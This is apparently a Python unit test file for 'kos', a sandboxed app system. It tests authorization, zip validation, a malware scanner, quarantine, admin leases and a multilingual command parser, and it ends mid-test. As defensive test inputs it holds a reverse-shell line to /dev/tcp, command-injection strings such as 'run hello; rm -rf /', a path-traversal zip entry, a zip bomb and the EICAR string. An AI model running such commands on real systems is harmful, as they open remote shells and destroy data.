"""Run with: python3 -m unittest discover -s tests -v"""

import io
import json
import os
import socket
import sys
import tempfile
import threading
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kos import loader  # noqa: E402
from kos.auth import Authority, AuthorizationDenied, KdfParams, PasswordStore, Throttle  # noqa: E402
from kos.cellagent import serve  # noqa: E402
from kos.cells import CellSpec, qemu_argv, send_app  # noqa: E402
from kos.devices import INPUT_EVENT, EvdevTranslator, ScriptedDevices  # noqa: E402
from kos.display import Framebuffer, GraphicalSurface, HeadlessBackend, parse_color  # noqa: E402
from kos.kapp import KApp, KAppError, pack  # noqa: E402
from kos.paths import Paths  # noqa: E402
from kos.prompt import ScriptedPrompter  # noqa: E402
from kos.protocol import Channel, ProtocolError, validate_app_message  # noqa: E402
from kos.sandbox import SandboxPolicy  # noqa: E402
from kos.session import Session  # noqa: E402
from kos.store import AppStore, TamperedError  # noqa: E402
from kos.term import KeyParser  # noqa: E402
from kos.vfs import VFS, VFSError  # noqa: E402
from kos.registry import Instance, Registry  # noqa: E402
from kos.broker import spawn  # noqa: E402
from kos.cmdsurface import CmdSurface  # noqa: E402
from kos.protocol import validate_app_message as _vam  # noqa: E402
from kos.scan import EICAR, scan_bytes  # noqa: E402
from kos.permit import PermitError, PermitStore  # noqa: E402
from kos.optimize import optimize  # noqa: E402
from kos import cache as kcache  # noqa: E402
from kos.store import VirusFoundError  # noqa: E402
from kos.watch import Watcher  # noqa: E402
from kos import cli as kcli  # noqa: E402

PW = "correct horse battery"
EXAMPLE = Path(__file__).resolve().parent.parent / "examples" / "hello"


class Env(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        os.chmod(self.tmp.name, 0o755)
        self.paths = Paths(Path(self.tmp.name))
        PasswordStore(self.paths).create(PW.encode(), KdfParams.fresh(n=2**10), throttle_base=0)
        self.kapp = Path(self.tmp.name) / "hello.kapp"
        pack(EXAMPLE, self.kapp)

    def tearDown(self):
        self.tmp.cleanup()
        shm = Path("/dev/shm") / f"kos-{os.getuid()}"          # empty RAM scratch left by fake spawners
        for d in shm.glob("*") if shm.exists() else []:
            try:
                d.rmdir()
            except OSError:
                pass

    def authority(self, *answers):
        self.prompter = ScriptedPrompter(answers)
        return Authority(self.paths, self.prompter, Throttle(self.paths, base=0))


class TestAuth(Env):
    def test_grant_is_bound_to_action(self):
        g = self.authority(PW).authorize("app.run", "hello")
        g.check("app.run", "hello")
        with self.assertRaises(AuthorizationDenied):
            g.check("app.install", "hello")
        g.close()
        with self.assertRaises(AuthorizationDenied):
            g.key("x")

    def test_wrong_password_denied_and_audited(self):
        a = self.authority("nope", "nope", "nope")
        with self.assertRaises(AuthorizationDenied):
            a.authorize("device.mouse", "hello")
        self.assertEqual([e["outcome"] for e in a.audit.entries()][-1], "denied")

    def test_unknown_action_refused(self):
        with self.assertRaises(AuthorizationDenied):
            self.authority().authorize("do.anything")


class TestKApp(Env):
    def zip_with(self, files):
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w") as z:
            for n, d in files.items():
                z.writestr(n, d)
        return b.getvalue()

    def test_rejects_traversal_and_bad_manifest(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m, "../evil": "x", "a.py": ""}))
        with self.assertRaises(KAppError):
            KApp(self.zip_with({"manifest.json": m.replace('"x"', '"graphical"'), "a.py": ""}))

    def test_rejects_zip_bomb(self):
        m = json.dumps({"name": "x", "version": "1", "runtime": "python", "entry": "a"})
        b = io.BytesIO()
        with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("manifest.json", m)
            z.writestr("a.py", "")
            z.writestr("bomb", b"\0" * (50 << 20))
        with self.assertRaises(KAppError):
            KApp(b.getvalue())


class TestStore(Env):
    def test_install_keeps_zip_and_detects_tamper(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        stored = self.paths.apps / "hello.kapp"
        self.assertEqual(stored.read_bytes(), self.kapp.read_bytes())  # never unzipped
        with self.authority(PW).authorize("app.run", "hello") as g:
            store.load_verified("hello", g)
        data = bytearray(stored.read_bytes())
        data[-30] ^= 1
        stored.write_bytes(bytes(data))
        with self.authority(PW).authorize("app.run", "hello") as g:
            with self.assertRaises(TamperedError):
                store.load_verified("hello", g)


    def test_update_requires_newer_version(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        src = Path(self.tmp.name) / "src"
        import shutil
        shutil.copytree(EXAMPLE, src)
        m = json.loads((src / "manifest.json").read_text())
        m["version"] = "0.9"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "old.kapp")
        with self.assertRaises(KAppError):
            store.update(Path(self.tmp.name) / "old.kapp", self.authority())
        m["version"] = "1.10"
        (src / "manifest.json").write_text(json.dumps(m))
        pack(src, Path(self.tmp.name) / "new.kapp")
        old, new = store.update(Path(self.tmp.name) / "new.kapp", self.authority(PW))
        self.assertEqual((old, new.version), ("1.0", "1.10"))
        with self.authority(PW).authorize("app.run", "hello") as g:
            self.assertEqual(store.load_verified("hello", g).manifest.version, "1.10")


class TestProtocol(unittest.TestCase):
    def test_escape_injection_stripped(self):
        m = validate_app_message({"cmd": "screen", "title": "\x1b]0;pwn\x07hi",
                                  "lines": ["a\x1b[2Jb"]}, "tui")
        self.assertEqual(m["title"], "]0;pwnhi")
        self.assertNotIn("\x1b", m["lines"][0])

    def test_mode_enforced(self):
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": []}, "tui")
        with self.assertRaises(ProtocolError):
            validate_app_message({"cmd": "frame", "ops": [["rect", 0, 0, 1, 1, "red"]]},
                                 "graphical")


class TestDisplayAndInput(unittest.TestCase):
    def test_rect_and_text(self):
        fb = Framebuffer(20, 10)
        fb.rect(2, 2, 3, 3, parse_color("#ff0000"))
        self.assertEqual(fb.pixel(3, 3), (255, 0, 0))
        self.assertEqual(fb.pixel(6, 6), (0, 0, 0))
        fb.text(0, 0, "I", parse_color("#00ff00"))
        self.assertEqual(fb.pixel(2, 1), (0, 255, 0))

    def test_key_parser(self):
        ev = KeyParser().feed(b"a\x1b[A\r\x03\x1b[<0;5;3M")
        self.assertEqual([e.get("key", e["type"]) for e in ev],
                         ["a", "up", "enter", "interrupt", "button"])
        self.assertEqual((ev[-1]["x"], ev[-1]["y"]), (4, 2))

    def test_evdev_translate(self):
        tr = EvdevTranslator(100, 100)
        raw = (INPUT_EVENT.pack(0, 0, 2, 0, 5) + INPUT_EVENT.pack(0, 0, 0, 0, 0)
               + INPUT_EVENT.pack(0, 0, 1, 0x110, 1) + INPUT_EVENT.pack(0, 0, 1, 30, 1))
        ev = tr.feed(raw)
        self.assertEqual(ev[0], {"type": "pointer", "x": 55, "y": 50})
        self.assertEqual(ev[1]["button"], "left")
        self.assertEqual(ev[2], {"type": "key", "key": "a"})


class TestSandboxedRun(Env):
    def test_session_boots_devices_with_password(self):
        """Full flow: app launched from zip in RAM; mouse and keyboard only
        reach the app after 'y' + password in the trusted prompt."""
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        with self.authority(PW).authorize("app.graphical", "hello") as g:
            app = store.load_verified("hello", g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), "graphical"), SandboxPolicy(), None)
        b.close()
        devices = ScriptedDevices()
        backend = HeadlessBackend(120, 80)
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = Session(name="hello", mode="graphical", channel=Channel(a), proc=proc,
                    surface=GraphicalSurface(backend), devices=devices, authority=auth)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        # A key before the keyboard is booted must NOT reach the app.
        devices.push({"type": "key", "key": "Z"})
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 50, "y": 60},
                     *keys("ok"))
        threading.Timer(4.0, lambda: devices.push({"type": "key", "key": "escape"})).start()
        code = s.run(first_frame_timeout=5)
        self.assertEqual(code, 0)
        self.assertEqual(devices.booted, ["mouse", "keyboard"])
        last = backend.frames[-1]
        self.assertEqual(last.pixel(49, 60), (255, 80, 128))  # the click drew a dot (OS cursor covers 50,60)
        outcomes = [(e["action"], e["outcome"]) for e in auth.audit.entries()]
        self.assertIn(("device.mouse", "granted"), outcomes)
        self.assertIn(("device.keyboard", "granted"), outcomes)

    def test_cell_agent_runs_app(self):
        """Cells hold Python/native apps only (no Node.js inside a cell VM)."""
        import shutil
        src = Path(self.tmp.name) / "hello-py"
        shutil.copytree(EXAMPLE, src)
        manifest = json.loads((src / "manifest.json").read_text())
        manifest.update(runtime="python", entry="app:main")
        (src / "manifest.json").write_text(json.dumps(manifest))
        pack(src, Path(self.tmp.name) / "hello-py.kapp")
        app = KApp((Path(self.tmp.name) / "hello-py.kapp").read_bytes())
        path = os.path.join(self.tmp.name, "agent.sock")
        lst = socket.socket(socket.AF_UNIX)
        lst.bind(path)
        lst.listen(1)
        t = threading.Thread(target=serve, args=(lst,), kwargs={"once": True})
        t.start()
        c = socket.socket(socket.AF_UNIX)
        c.connect(path)
        send_app(c, app, "tui")
        c.sendall(b'{"cmd":"hello","mode":"tui","width":80,"height":20}\n')
        msg = json.loads(c.makefile().readline())
        self.assertEqual(msg["cmd"], "screen")
        c.sendall(b'{"cmd":"quit"}\n')
        c.close()
        t.join(10)

    def test_qemu_argv_pins_cores(self):
        argv = qemu_argv(CellSpec("web", "/k", "/i", cpus=[2, 3], cid=5), "/log")
        self.assertEqual(argv[:3], ["taskset", "-c", "2,3"])
        self.assertIn("vhost-vsock-device,guest-cid=5", argv)


class TestVFS(Env):
    def test_cd_into_zip_without_extracting(self):
        vfs = VFS(self.tmp.name)
        vfs.cd("hello.kapp")
        names = {e.name for e in vfs.list()}
        self.assertIn("manifest.json", names)
        self.assertIn("app.py", names)
        data = vfs.read_bytes("manifest.json")
        self.assertIn(b'"hello"', data)
        self.assertFalse(Path(self.tmp.name, "manifest.json").exists())  # never extracted
        vfs.up()
        self.assertEqual(vfs.pwd(), self.tmp.name)

    def test_bad_moves_rejected(self):
        vfs = VFS(self.tmp.name)
        with self.assertRaises(VFSError):
            vfs.cd("does-not-exist")
        with self.assertRaises(VFSError):
            vfs.up()  # already at the top


class TestCmdMode(unittest.TestCase):
    def test_screen_and_frame_rejected_in_cmd_mode(self):
        with self.assertRaises(Exception):
            _vam({"cmd": "screen", "title": "x", "lines": []}, "cmd")
        with self.assertRaises(Exception):
            _vam({"cmd": "frame", "ops": []}, "cmd")
        self.assertEqual(_vam({"cmd": "log", "msg": "hi"}, "cmd"), {"cmd": "log", "msg": "hi"})

    def test_cmd_surface_echoes_commands(self):
        r, w = os.pipe()
        surface = CmdSurface(w, 80, 24, "hello")
        surface.emit(">", {"cmd": "key", "key": "a"})
        surface.emit("<", {"cmd": "log", "msg": "got it"})
        os.close(w)
        with os.fdopen(r) as rf:
            out = rf.read()
        self.assertIn('> {"cmd":"key","key":"a"}', out)
        self.assertIn('< {"cmd":"log","msg":"got it"}', out)


def _alive_pid(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False


class TestOpenAttachClose(Env):
    """The `open`/`ps`/`attach`/`close` lifecycle, exercised in cmd mode so
    no real terminal is needed: `open` launches the app in the background
    under a broker, `attach` drives it, Ctrl-C detaches (app keeps running),
    `close` actually stops it."""

    def _open(self, mode="cmd"):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        action = "app.graphical" if mode == "graphical" else "app.open"
        with self.authority(PW).authorize(action, "hello") as grant:
            app = store.load_verified("hello", grant)
        registry = Registry(self.paths)
        inst_id = registry.new_id("hello")
        inst = Instance(id=inst_id, name="hello", mode=mode, broker_pid=0,
                        sock_path=str(self.paths.state / "instances" / f"{inst_id}.sock"),
                        log_path=str(self.paths.logs / f"{inst_id}.log"), started=0)
        spawn(inst, app, mode, SandboxPolicy(), registry, Path(inst.log_path))
        return registry, inst_id

    def _wait_running(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return insts[inst_id]
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")

    def test_open_ps_attach_detach_close(self):
        registry, inst_id = self._open("cmd")
        inst = self._wait_running(registry, inst_id)
        self.assertTrue(inst.app_pid)
        self.assertEqual([i.id for i in registry.list()], [inst_id])

        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.connect(inst.sock_path)
        from kos.devices import ScriptedDevices
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        devices = ScriptedDevices()
        r_fd, w_fd = os.pipe()
        cmdsurface = CmdSurface(w_fd, 80, 24, "hello")
        s = Session(name="hello", mode="cmd", channel=Channel(sock), proc=None,
                    surface=cmdsurface, devices=devices, authority=auth,
                    detach_on_interrupt=True)
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # mouse
        devices.push(*keys("y"), *keys(PW), {"type": "key", "key": "enter"})   # keyboard
        devices.push({"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1})
        devices.push({"type": "interrupt"})  # Ctrl-C: must DETACH, not kill the app
        code = s.run(first_frame_timeout=0.2)
        os.close(w_fd)
        self.assertEqual(code, 0)
        self.assertTrue(s.detached)
        with os.fdopen(r_fd) as rf:
            log = rf.read()
        self.assertIn('"cmd":"button"', log)   # our click really reached the app
        self.assertIn('"cmd":"log"', log)      # and the app really answered

        # still running after detach
        self.assertEqual(registry.get(inst_id).status, "running")
        self.assertTrue(_alive_pid(registry.get(inst_id).broker_pid))

        # close actually stops it
        import signal
        import time
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not (self.paths.state / "instances" / f"{inst_id}.json").exists():
                break
            time.sleep(0.1)
        self.assertFalse((self.paths.state / "instances" / f"{inst_id}.json").exists())
        self.assertFalse(os.path.exists(inst.sock_path))

    def test_two_opens_are_independent(self):
        registry, id1 = self._open("cmd")
        registry, id2 = self._open("cmd")
        self._wait_running(registry, id1)
        self._wait_running(registry, id2)
        ids = {i.id for i in registry.list()}
        self.assertEqual(ids, {id1, id2})
        import signal
        import time
        os.kill(registry.get(id1).broker_pid, signal.SIGTERM)
        os.kill(registry.get(id2).broker_pid, signal.SIGTERM)
        for _ in range(50):
            if not registry.list():
                break
            time.sleep(0.1)
        self.assertEqual(registry.list(), [])


class TestActivity(Env):
    def test_feed_merges_open_apps_and_audit(self):
        from kos.activity import build_feed, render_feed
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        registry, inst_id = TestOpenAttachClose._open(self, "cmd")
        self._wait_running_local(registry, inst_id)
        items = build_feed(self.paths)
        texts = [i.text for i in items]
        self.assertTrue(any("hello" in t and "open" in t for t in texts))
        self.assertTrue(any("app.install" in t for t in texts))
        self.assertIn("hello", render_feed(items))
        import signal
        os.kill(registry.get(inst_id).broker_pid, signal.SIGTERM)

    def _wait_running_local(self, registry, inst_id, timeout=5):
        import time
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            insts = {i.id: i for i in registry.list()}
            if inst_id in insts and insts[inst_id].status == "running":
                return
            time.sleep(0.05)
        raise AssertionError("instance never reached 'running'")


class TestScan(unittest.TestCase):
    def test_eicar_flagged_clean_file_passes(self):
        self.assertFalse(scan_bytes(EICAR, "eicar").clean)
        self.assertTrue(scan_bytes(b"print('hello')", "hello.py").clean)

    def test_recurses_into_zip_without_extracting(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", "{}")
            z.writestr("payload.bin", EICAR)
        result = scan_bytes(buf.getvalue(), "evil.kapp")
        self.assertFalse(result.clean)
        self.assertTrue(any("payload.bin" in f.path for f in result.findings))

    def test_reverse_shell_pattern_detected(self):
        r = scan_bytes(b"os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')", "x.py")
        self.assertFalse(r.clean)
        self.assertEqual(r.findings[0].rule, "reverse-shell")


class TestInstallScanning(Env):
    def test_flagged_app_is_quarantined_not_installed(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("manifest.json", json.dumps(
                {"name": "evil", "version": "1", "runtime": "python", "entry": "a"}))
            z.writestr("a.py", "def main():\n    pass\n# " + EICAR.decode())
        bad = Path(self.tmp.name) / "evil.kapp"
        bad.write_bytes(buf.getvalue())
        store = AppStore(self.paths)
        with self.assertRaises(VirusFoundError):
            store.install(bad, self.authority(PW))
        self.assertNotIn("evil", [a.name for a in store.installed()])
        quarantined = list((self.paths.state / "quarantine").glob("*.kapp"))
        self.assertEqual(len(quarantined), 1)
        # no password was ever spent on it: nothing was asked
        self.assertEqual(self.prompter.asked, [])

    def test_clean_app_still_installs(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        self.assertIn("hello", [a.name for a in store.installed()])


class TestPermit(Env):
    def test_grant_revoke_require(self):
        p = PermitStore(self.paths)
        with self.assertRaises(PermitError):
            p.require("hello")
        p.grant("hello")
        p.require("hello")  # no raise
        self.assertEqual([x.name for x in p.list()], ["hello"])
        p.revoke("hello")
        with self.assertRaises(PermitError):
            p.require("hello")

    def test_permit_gate_blocks_run_before_any_password_prompt(self):
        """PermitStore.require() runs before _authority() in cmd_run/cmd_open,
        so an unpermitted app is refused without ever touching a TTY."""
        import os as _os
        old_root = _os.environ.get("KOS_ROOT")
        _os.environ["KOS_ROOT"] = str(self.paths.root)
        try:
            code = kcli.main(["run", "hello"])
        finally:
            if old_root is None:
                _os.environ.pop("KOS_ROOT", None)
            else:
                _os.environ["KOS_ROOT"] = old_root
        self.assertEqual(code, 2)


class TestOptimize(Env):
    def test_recompress_shrinks_and_reseals(self):
        store = AppStore(self.paths)
        store.install(self.kapp, self.authority(PW))
        kapp_path = self.paths.apps / "hello.kapp"
        # re-store it uncompressed so there is guaranteed slack to reclaim
        import zipfile as _zf
        data = kapp_path.read_bytes()
        buf = io.BytesIO()
        with _zf.ZipFile(io.BytesIO(data)) as src, _zf.ZipFile(buf, "w", _zf.ZIP_STORED) as dst:
            for info in src.infolist():
                dst.writestr(info.filename, src.read(info.filename))
        kapp_path.write_bytes(buf.getvalue())

        report = optimize(self.paths, self.authority(PW))
        self.assertGreaterEqual(report.apps_recompressed, 1)
        self.assertGreater(report.bytes_reclaimed, 0)

        # still verifies after being recompressed and re-sealed
        with self.authority(PW).authorize("app.run", "hello") as g:
            app = store.load_verified("hello", g)
        self.assertEqual(app.manifest.name, "hello")

    def test_prunes_dead_registry_entries(self):
        from kos.registry import Instance, Registry
        registry = Registry(self.paths)
        registry.write(Instance(id="dead-1", name="hello", mode="cmd", broker_pid=999999999,
                                sock_path="/nonexistent", log_path="/nonexistent", started=0))
        report = optimize(self.paths, self.authority(PW))
        self.assertEqual(report.dead_instances_pruned, 1)
        self.assertEqual(registry.list(), [])


class TestCache(unittest.TestCase):
    def test_wipe_removes_contents_and_directory(self):
        with tempfile.TemporaryDirectory() as base:
            paths = Paths(Path(base))
            d = kcache.alloc(paths, "hello")
            (d / "secret.txt").write_text("do not persist me")
            (d / "sub").mkdir()
            (d / "sub" / "more.txt").write_text("nor me")
            self.assertTrue(d.exists())
            kcache.wipe(d)
            self.assertFalse(d.exists())

    def test_wipe_of_missing_dir_is_a_noop(self):
        kcache.wipe(Path("/nonexistent/definitely/not/here"))  # must not raise


class TestWatcher(unittest.TestCase):
    def test_detects_a_write_and_the_scanner_flags_it(self):
        from kos.scan import scan_file
        with tempfile.TemporaryDirectory() as d:
            w = Watcher([d])
            (Path(d) / "payload.bin").write_bytes(EICAR)
            import time
            time.sleep(0.2)
            events = w.read_events()
            w.close()
            self.assertTrue(any(e.endswith("payload.bin") for e in events))
            result = scan_file(Path(events[0]))
            self.assertFalse(result.clean)
            self.assertEqual(result.findings[0].rule, "eicar-test-file")


if __name__ == "__main__":
    unittest.main()


class TestLang(unittest.TestCase):
    """Every line is a command - unless it is code."""

    def argv(self, line):
        r = __import__("kos.lang", fromlist=["interpret"]).interpret(line)
        self.assertEqual(r.kind, "command", line)
        return list(r.argv)

    def test_same_command_in_many_languages(self):
        for line in ["run hello", "ejecuta hello", "lance hello", "starte hello",
                     "esegui hello", "запусти hello", "运行 hello", "运行hello"]:
            self.assertEqual(self.argv(line), ["run", "hello"], line)

    def test_politeness_articles_and_case_are_ignored(self):
        self.assertEqual(self.argv("Please run the app Hello."), ["run", "hello"])
        self.assertEqual(self.argv("s'il vous plaît lance l'app hello"), ["run", "hello"])
        self.assertEqual(self.argv("por favor, abre hello"), ["open", "hello"])

    def test_mode_words_and_other_verbs(self):
        self.assertEqual(self.argv("abre gráfico hello"), ["open", "graphical", "hello"])
        self.assertEqual(self.argv("escanea notes.kapp"), ["scan", "file", "notes.kapp"])
        self.assertEqual(self.argv("revoke hello"), ["permit", "--revoke", "hello"])
        self.assertEqual(self.argv("escritorio"), ["boot", "desktop"])
        self.assertEqual(self.argv("optimiza"), ["optimize"])

    def test_write_text_is_passed_through_verbatim(self):
        self.assertEqual(self.argv("write notes.txt Hello World."),
                         ["write", "notes.txt", "--text", "Hello World."])
        self.assertEqual(self.argv('write notes.txt "a  b!"'),
                         ["write", "notes.txt", "--text", "a  b!"])

    def test_code_is_a_command_too_and_runs_sandboxed(self):
        from kos.lang import interpret
        for line, lang in [("x = 5", "assignment"), ('print("hi")', "code call"),
                           ("import os", "python"), ("#include <stdio.h>", "c"),
                           ("const a = 1", "javascript"), ("SELECT * FROM users", "sql"),
                           ("run hello; rm -rf /", "shell"), ("list | sh", "shell")]:
            r = interpret(line)
            self.assertEqual((r.kind, r.language), ("code", lang), line)
            self.assertEqual(r.argv[0], "exec")                       # a command, never a shell string
            self.assertEqual(r.argv[2], "--code=" + line)

    def test_plain_words_that_are_also_code_keywords_still_work(self):
        self.assertEqual(self.argv("update hello"), ["update", "hello"])
        self.assertEqual(self.argv("open hello"), ["open", "hello"])
        self.assertEqual(self.argv("run hello --cell=c1"), ["run", "hello", "--cell=c1"])

    def test_unknown_suggests_but_never_guesses(self):
        from kos.lang import interpret
        r = interpret("rn hello")
        self.assertEqual((r.kind, r.hint), ("unknown", "run"))
        self.assertEqual(interpret("banana split").kind, "unknown")

    def test_shell_loop_runs_every_line_as_a_command(self):
        from kos.lang import run_shell
        lines = iter(["run hello", "x = 1", "bonjour", "", "ayuda", "exit", "list"])
        ran, said = [], []
        code = run_shell(lambda argv: ran.append(argv) or 0, lambda _p: next(lines), said.append)
        self.assertEqual(ran, [["run", "hello"], ["exec", "--lang=assignment", "--code=x = 1"]])
        self.assertTrue(any("don't know" in m for m in said))
        self.assertEqual(code, 65)

    def test_cli_do_executes_the_interpreted_command(self):
        import io as _io
        from contextlib import redirect_stdout
        buf = _io.StringIO()
        with tempfile.TemporaryDirectory() as d, redirect_stdout(buf):
            old = os.environ.get("KOS_ROOT")
            os.environ["KOS_ROOT"] = d
            try:
                code = kcli.main(["do", "lista"])
            finally:
                os.environ.pop("KOS_ROOT", None) if old is None else os.environ.update(KOS_ROOT=old)
        self.assertEqual(code, 0)
        self.assertIn("no apps installed", buf.getvalue())
        # code is a command too; one with no sandboxed runtime says so (66) and runs nothing
        with redirect_stdout(io.StringIO()):
            self.assertEqual(kcli.main(["do", "const", "a", "=", "1"]), 66)


from unittest import mock  # noqa: E402
from kos.admin import (AdminError, AdminKeyboard, AdminPrompter, WriteBlocked,  # noqa: E402
                       kernel_gaps, write_file)

GOOD_KERNEL = {"landlock_abi": 3, "user_namespaces": True}


class AdminEnv(Env):
    def kb(self, **kw):
        args = dict(kernel_report=lambda: dict(GOOD_KERNEL), probe=lambda: ["/dev/input/event0"],
                    boot_id=lambda: "boot-1")
        args.update(kw)
        return AdminKeyboard(self.paths, **args)

    def booted(self, **kw):
        kb = self.kb(**kw)
        with self.authority(PW).authorize("session.login") as g:
            kb.boot(g)
        return kb


class TestAdminKeyboard(AdminEnv):
    def test_login_password_boots_it_with_no_second_prompt(self):
        auth = self.authority(PW)                       # exactly ONE password is available
        kb = self.kb()
        with auth.authorize("session.login") as grant:
            lease = kb.boot(grant)
        self.assertEqual(self.prompter.answers, [])     # nothing left over, nothing asked twice
        self.assertTrue(lease.exclusive and not lease.weak)
        self.assertIn("ON", kb.status())
        self.assertIn(("admin.boot", "booted"),
                      [(e["action"], e["outcome"]) for e in auth.audit.entries()])

    def test_only_a_login_or_admin_boot_grant_can_boot_it(self):
        with self.authority(PW).authorize("app.run", "hello") as g:
            with self.assertRaises(AdminError):
                self.kb().boot(g)
        self.assertFalse((self.paths.state / "admin-lease.json").exists())

    def test_requires_the_kernel_to_run(self):
        for report in ({"landlock_abi": 0, "user_namespaces": True},
                       {"landlock_abi": 3, "user_namespaces": False}):
            kb = self.kb(kernel_report=lambda r=report: r)
            with self.authority(PW).authorize("session.login") as g:
                with self.assertRaises(AdminError) as ctx:
                    kb.boot(g)
            self.assertIn("needs the KOS kernel", str(ctx.exception))
            self.assertFalse(kb.file.exists())
        self.assertEqual(kernel_gaps(GOOD_KERNEL), [])

    def test_kernel_is_rechecked_on_every_use(self):
        state = {"r": dict(GOOD_KERNEL)}
        kb = self.booted(kernel_report=lambda: state["r"])
        kb.require_booted()
        state["r"] = {"landlock_abi": 0, "user_namespaces": True}
        with self.assertRaises(AdminError):
            kb.require_booted()

    def test_no_keyboard_means_no_admin_keyboard(self):
        kb = self.kb(probe=lambda: [])
        with self.authority(PW).authorize("session.login") as g:
            with self.assertRaises(AdminError):
                kb.boot(g)

    def test_weak_dev_mode_is_explicit_and_marked(self):
        kb = self.kb(kernel_report=lambda: {"landlock_abi": 0}, probe=lambda: [])
        with mock.patch.dict(os.environ, {"KOS_DEV_ADMIN_WEAK": "1"}):
            with self.authority(PW).authorize("session.login") as g:
                lease = kb.boot(g)
            self.assertTrue(lease.weak and not lease.exclusive)
            self.assertIn("WEAK", kb.status())
            kb.require_booted()
        with self.assertRaises(AdminError):             # the env var is needed on every use
            kb.require_booted()

    def test_expiry_other_boot_and_lock(self):
        t = {"now": 1000.0}
        kb = self.booted(now=lambda: t["now"])
        kb.require_booted()
        t["now"] += 9 * 3600
        with self.assertRaises(AdminError):
            kb.require_booted()
        kb2 = self.kb(boot_id=lambda: "boot-2", now=lambda: 1000.0)
        with self.assertRaises(AdminError):
            kb2.require_booted()
        kb3 = self.kb(boot_id=lambda: "boot-1", now=lambda: 1000.0)
        kb3.require_booted()
        kb3.shutdown()
        with self.assertRaises(AdminError):
            kb3.require_booted()

    def test_forged_lease_fails_the_signature(self):
        kb = self.booted(now=lambda: 1000.0)
        doc = json.loads(kb.file.read_text())
        doc["expires"] += 10 ** 9                       # an attacker extends it
        kb.file.write_text(json.dumps(doc))
        with self.authority(PW).authorize("file.write", "x") as g:
            with self.assertRaises(AdminError) as ctx:
                kb.verify(g)
        self.assertIn("signature", str(ctx.exception))

    def test_admin_prompter_reads_the_password_from_devices(self):
        dev = ScriptedDevices()
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        dev.push(*keys("abcX"), {"type": "key", "key": "backspace"}, *keys("d"),
                 {"type": "key", "key": "enter"})
        out = io.StringIO()
        self.assertEqual(AdminPrompter(dev, out).password("pw: "), b"abcd")
        dev.push({"type": "key", "key": "escape"})
        self.assertIsNone(AdminPrompter(dev, out).password("pw: "))
        dev.close()


class TestGuardedWrite(AdminEnv):
    def setUp(self):
        super().setUp()
        self.kb_ = self.booted()
        from kos.requires import Ledger
        self.ledger = Ledger(self.paths)
        self.out = Path(self.tmp.name) / "out"
        self.out.mkdir()

    def write(self, name, data, answers=(PW,), **kw):
        return write_file(self.paths, self.authority(*answers), self.kb_,
                          str(self.out / name), data, **kw)

    def test_write_then_scan_then_optimize_are_required_afterwards(self):
        order, target = [], self.out / "a.txt"

        def scanner(data, label):
            order.append(("scan", target.exists(), self.ledger.owed("file.write")[0]["pending"][:]))
            return scan_bytes(data, label)

        def optimizer(paths, authority, grant=None):
            order.append(("optimize", target.exists(), self.ledger.owed("file.write")[0]["pending"][:]))
            return optimize(paths, authority, grant=grant)

        r = self.write("a.txt", b"hello", scanner=scanner, optimizer=optimizer)
        # the file is already there when the scan runs; both are owed until each is done
        self.assertEqual(order, [("scan", True, ["scan", "optimize"]), ("optimize", True, ["optimize"])])
        self.assertEqual(self.ledger.owed(), [])               # nothing left owed
        self.assertEqual(target.read_bytes(), b"hello")
        self.assertEqual(oct(target.stat().st_mode & 0o777), "0o600")
        self.assertTrue(r.scan.clean)
        self.assertIn("reclaimed", r.optimize_summary)

    def test_flagged_content_is_quarantined_afterwards_and_the_optimize_still_runs(self):
        called = []
        with self.assertRaises(WriteBlocked):
            self.write("bad.txt", EICAR, optimizer=lambda *a, **k: called.append(1))
        self.assertFalse((self.out / "bad.txt").exists())          # taken out of place
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("write-*bad.txt"))), 1)
        self.assertEqual(called, [1])                              # optimize was still owed
        self.assertEqual(self.ledger.owed(), [])
        outcomes = [e["outcome"] for e in AuditLogFor(self.paths) if e["action"] == "file.write"]
        self.assertIn("quarantined-by-scan", outcomes)

    def test_failed_optimize_stays_owed_and_blocks_the_next_write_until_settled(self):
        def boom(paths, authority, grant=None):
            raise OSError("disk exploded")
        with self.assertRaises(OSError):
            self.write("c.txt", b"data", optimizer=boom)
